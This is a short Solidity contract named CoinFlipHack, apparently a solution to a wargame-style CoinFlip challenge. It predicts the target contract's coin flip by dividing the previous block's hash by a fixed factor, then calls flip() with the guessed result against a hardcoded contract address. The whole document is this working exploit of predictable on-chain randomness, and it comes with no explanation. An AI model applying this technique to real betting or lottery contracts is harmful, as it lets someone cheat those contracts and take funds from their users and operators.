// "SPDX-License-Identifier: UNLICENSED"
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "./CoinFlip.sol";

contract CoinFlipHack {

  using SafeMath for uint256;
  address target_address = 0xF3DB36bAcc4d7f47E970010E8D3328e3e662b49F;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip originalContract;

  constructor() public {
      originalContract = CoinFlip(target_address);
  }
  function hack() public returns (bool){
    
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool _guess = coinFlip == 1 ? true : false;

    originalContract.flip(_guess);

  }

}